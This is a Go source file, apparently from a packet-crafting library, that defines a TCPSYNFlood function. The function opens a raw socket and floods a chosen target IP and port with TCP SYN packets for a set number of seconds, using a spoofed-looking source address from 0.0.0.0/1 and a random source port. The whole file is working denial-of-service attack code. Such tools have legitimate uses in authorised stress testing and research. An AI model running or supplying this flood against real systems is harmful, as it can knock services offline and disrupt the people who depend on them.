package higherlevel

import (
	"log"
	"time"

	packet "github.com/tiagomdiogo/GoPpy/packet"
	"github.com/tiagomdiogo/GoPpy/supersocket"
	utils "github.com/tiagomdiogo/GoPpy/utils"
)

func TCPSYNFlood(targetIP, targetPort, payload string, attackDuration int) {
	socket, err := supersocket.NewSuperSocket("eth0", "")
	if err != nil {
		log.Fatal(err)
	}
	defer socket.Close()

	// Define the deadline for the attack to stop.
	end := time.Now().Add(time.Duration(attackDuration) * time.Second)

	srcIP, err := utils.ParseIPGen("0.0.0.0/1")

	srcPort := utils.RandomPort()
	for time.Now().Before(end) {

		packet, err := packet.CraftTCPPacket(srcIP, targetIP, srcPort, targetPort, payload, "SYN")
		if err != nil {
			log.Fatal(err)
		}

		err = socket.Send(packet)
		if err != nil {
			log.Fatal(err)
		}
	}
}
